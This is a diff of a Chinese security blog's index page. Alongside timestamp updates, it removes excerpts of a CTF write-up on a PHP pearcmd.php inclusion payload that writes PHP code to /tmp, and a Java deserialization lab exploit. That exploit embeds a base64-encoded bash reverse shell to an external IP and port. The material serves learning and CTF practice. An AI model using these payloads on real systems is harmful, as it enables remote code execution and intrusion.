@@ -228,10 +228,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-08-02 15:49:29 / 修改时间：16:33:51" itemprop="dateCreated datePublished" datetime="2022-08-02T15:49:29+08:00">2022-08-02</time>
+              <time title="创建时间：2022-08-02 15:49:29" itemprop="dateCreated datePublished" datetime="2022-08-02T15:49:29+08:00">2022-08-02</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-06 17:57:35" itemprop="dateModified" datetime="2022-08-06T17:57:35+08:00">2022-08-06</time>
+              </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -259,34 +265,14 @@
 
       
           <h1 id="PHP杂记"><a href="#PHP杂记" class="headerlink" title="PHP杂记"></a>PHP杂记</h1><p>最近hvv当蓝队，每天闲的要死，又不能打游戏，于是就开始认真读文章，复现</p>
-<p>前两天打强网+dsctf，打的挺自闭的，也发现了自己的一些问题，之前打比赛搜payload有时候搜到了就直接用了，完全没懂原理，稍微一改就没想出来，比如昨天的php://filter我现在才知道是流处理器，能做很多事情，于是抽时间把很多关于php的部分复现了。</p>
-<h2 id="CISCN2022华北"><a href="#CISCN2022华北" class="headerlink" title="CISCN2022华北"></a>CISCN2022华北</h2><p>签到题，当时直接搜的p牛的php裸包含，payload抄来改改直接用了，但细想有很多地方不理解。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</span><br></pre></td></tr></table></figure>
-<p>读完p牛文章大概意思就是说php会把?query-string没有等号的会当做命令行参数，所以可以用pearcmd.php来传入参数来执行php脚本，其中这个config-create就是写配置文件的。</p>
-<ul>
-<li><p>Root directory must be an absolute path beginning with “/“, was: “123”</p>
-<p><img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802155625660.png" alt="image-20220802155625660"></p>
-<p>这就解释了为什么是<code>/&lt;?=phpinfo()?&gt;</code></p>
-<p>成功写进来长这样：</p>
-<p><img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802155821716.png" alt="image-20220802155821716"></p>
-<p>里面包含了很多乱七八糟的，但只要有&lt;?php就好了。</p>
-</li>
-</ul>
-<p>  <img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802161238202.png" alt="image-20220802161238202"></p>
-<p>  <img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802161303293.png" alt="image-20220802161303293"></p>
-<ul>
-<li><p>剩下的我们需要搞清楚php对我们url的处理，如何理解get的参数，如何理解argv？</p>
-<p>分析得到通过+来划分argv</p>
-<p><img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802162953953.png" alt="image-20220802162953953"></p>
-<p>所以，这段代码的意思就相当于下图，直接执行了这个命令，写进了配置文件。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php pearcmd.php config-create /&amp;page=../../../usr/local/lib/php/pearcmd&amp;/%<span class="number">3</span>C?php%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">201</span>;?%<span class="number">3</span>E /tmp/aab</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802163051556.png" alt="image-20220802163051556"></p>
-<p>然后$_GET理解没有变化，都是按照&amp;来分割，=来区分键值对。</p>
-<p><img src="/2022/08/02/php%E6%9D%82%E8%AE%B0/assets/image-20220802163233383.png" alt="image-20220802163233383"></p>
-</li>
-</ul>
-<p>综上，这个利用payload是巧妙的将php对url中get变量的分离与argv变量的分离构造出来的，虽然很简单，但不得不说很巧妙。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/02/php%E6%9D%82%E8%AE%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -328,10 +314,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-07-04 15:50:19 / 修改时间：16:41:20" itemprop="dateCreated datePublished" datetime="2022-07-04T15:50:19+08:00">2022-07-04</time>
+              <time title="创建时间：2022-07-04 15:50:19" itemprop="dateCreated datePublished" datetime="2022-07-04T15:50:19+08:00">2022-07-04</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-08 15:11:54" itemprop="dateModified" datetime="2022-08-08T15:11:54+08:00">2022-08-08</time>
+              </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -339,14 +331,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
+              <span>8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -360,12 +352,14 @@
       
           <h1 id="javaDeserializeLabs"><a href="#javaDeserializeLabs" class="headerlink" title="javaDeserializeLabs"></a>javaDeserializeLabs</h1><p><a target="_blank" rel="noopener" href="https://github.com/waderwu/javaDeserializeLabs">https://github.com/waderwu/javaDeserializeLabs</a></p>
 <p>自己练一练写exp，顺便思考一下各种细节</p>
-<h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>远程内置一个恶意类，通过反射修改private字段来rce。注意package要与远程一致才可以。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserializelab.lab1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> utils.Utils.objectToHexString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">lab1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        com.yxxx.javasec.deserialize.Calc calc = <span class="keyword">new</span> com.yxxx.javasec.deserialize.Calc();</span><br><span class="line">        setFieldValue(calc, <span class="string">&quot;canPopCalc&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">        setFieldValue(calc, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ5LjIzMy4xMTUuMjI2Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        System.out.println(objectToHexString(calc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="setFieldValue"><a href="#setFieldValue" class="headerlink" title="setFieldValue"></a>setFieldValue</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">	field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这是位于<code>ysoserialize</code>中<code>Reflections</code>的代码，用于给<code>private</code>属性的变量赋值，但是我们经常会看到在之前加一句：<code>field.setAccessible(true);</code></p>
-<p>值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。值为 false 则指示反射的对象应该实施 Java 语言访问检查;实际上setAccessible是启用和禁用访问安全检查的开关,并不是为true就能访问为false就不能访问 ；<strong>可以达到提升反射速度的目的</strong> 。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/04/java-deserializelab/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -588,7 +582,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-08 11:44:39" itemprop="dateModified" datetime="2022-07-08T11:44:39+08:00">2022-07-08</time>
+                <time title="修改时间：2022-11-29 16:38:00" itemprop="dateModified" datetime="2022-11-29T16:38:00+08:00">2022-11-29</time>
               </span>
 
           <br>
@@ -597,14 +591,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>24k</span>
+              <span>33k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>22 分钟</span>
+              <span>30 分钟</span>
             </span>
 
         </div>
@@ -1221,13 +1215,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">172k</span>
+    <span title="站点总字数">187k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:36</span>
+    <span title="站点阅读时长">2:50</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
